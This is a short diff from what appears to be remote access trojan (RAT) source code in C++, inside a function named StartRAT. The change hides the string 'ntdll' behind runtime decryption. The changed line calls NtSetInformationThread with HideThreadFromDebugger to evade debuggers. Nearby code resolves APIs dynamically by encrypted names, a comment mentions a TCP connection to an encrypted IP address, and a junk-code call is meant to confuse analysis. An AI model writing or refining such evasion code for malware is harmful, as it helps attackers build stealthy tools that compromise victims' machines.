@@ -32,7 +32,7 @@ DWORD WINAPI StartRAT(LPVOID lpParam)
 	// create wrappers that where needed, you just call it like this:  TCPClient* conn = new TCPClient(arrayToString(str_ip_encrypt), 54000);
 	// or in the resolve_dynamically: resolve_dynamically<GetCurrentThread_t>(arrayToCStr(str_GetCurrentThread_encrypt));
 	GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>(string_decrypt(str_GetCurrentThread, str_GetCurrentThread_len).c_str());
-	resolve_dynamically<NtSetInformationThread_t>(string_decrypt(str_NtSetInformationThread, str_NtSetInformationThread_len).c_str(), NTDLL_STR)(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);
+	resolve_dynamically<NtSetInformationThread_t>(string_decrypt(str_NtSetInformationThread, str_NtSetInformationThread_len).c_str(), string_decrypt_cstr(str_ntdll, str_ntdll_len))(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);
 
 	suspicious_junk_3();
 
